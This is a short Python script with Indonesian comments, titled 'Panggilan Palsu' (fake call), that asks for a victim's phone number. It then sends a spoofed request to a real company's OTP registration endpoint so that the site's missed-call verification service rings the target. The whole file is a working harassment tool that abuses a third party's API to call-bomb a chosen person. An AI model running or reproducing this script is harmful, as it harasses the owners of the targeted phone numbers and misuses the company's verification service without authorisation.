import requests as rek
import json,os,sys 

logo = """
         Panggilan Palsu
 {@} Creator : Dimas
 {@} Fungsi  : Membuat panggilan telpon ke nomor target menggunakan bot.
 {@} Email   : microosfteinc@gmail.com

     Version : 1.5
     Subscribe untuk mendapatkan pemberitahuan

Panggilan diawali 8
       contoh: 
               Nomor Korban (+62895xxxxxxxx)
               Ditulis: (895xxxxxxxxx)
<<---------------------------------------->>"""


os.system('clear')
print(logo)

target = input(" Target Call : ")


api_url = "https://www.nutriclub.co.id/otp/?phone=0"+target+"&old_phone=0"+target

headers = {
"Host": "www.nutriclub.co.id",
"content-length": "0","accept":
"application/json, text/javascript, */*; q=0.01",
"x-requested-with": "XMLHttpRequest",
"save-data": "on",
"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
"origin": "https://www.nutriclub.co.id",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty","referer": "https://www.nutriclub.co.id/account/register",
}


respon = rek.post(api_url,headers).text

status = json.loads(respon)["StatusMessage"]
if status == "Request misscall berhasil":
     print("\n {✓} Mengirim panggilan ke "+ target +" Berhasil \n")
else:
     print("\n {×} Panggilan sudah dilakukan 3x » Gagal \n")
